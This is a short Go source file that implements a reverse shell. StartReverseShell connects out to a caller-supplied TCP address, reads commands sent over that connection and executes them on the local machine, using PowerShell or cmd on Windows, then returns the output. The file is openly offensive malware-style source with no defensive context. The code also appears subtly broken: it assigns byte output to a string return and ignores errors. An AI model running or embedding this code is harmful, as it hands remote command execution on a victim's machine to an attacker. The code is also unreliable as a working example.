package shell

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

const prompt = runtime.GOOS + " > "

// StartReverseShell starts a reverse shell from the current machine to address.
func StartReverseShell(address string) {
	conn, _ := net.Dial("tcp", address)

	for {
		fmt.Fprintf(conn, "\n%s", prompt)

		message, _ := bufio.NewReader(conn).ReadString('\n')
		toExec := strings.TrimSuffix(message, "\n")

		if toExec == "exit" {
			return
		}

		args := strings.Fields(toExec)
		res := execArgs(args)

		fmt.Fprintf(conn, res)
	}
}

// execArgs takes a list of arguments (the first one being a binary) and executes it locally.
func execArgs(args []string) (out string) {
	if runtime.GOOS == "windows" {
		var cmdPrefix []string

		_, err := exec.LookPath("Powershell")
		if err != nil {
			cmdPrefix = append(cmdPrefix, "cmd", "/C")
		} else {
			cmdPrefix = append(cmdPrefix, "Powershell")
		}

		args = append(cmdPrefix, args...)
	}

	out, err := exec.Command(args[0], args[1:]...).Output()
	if err != nil {
		return err.Error()
	}
	return out
}
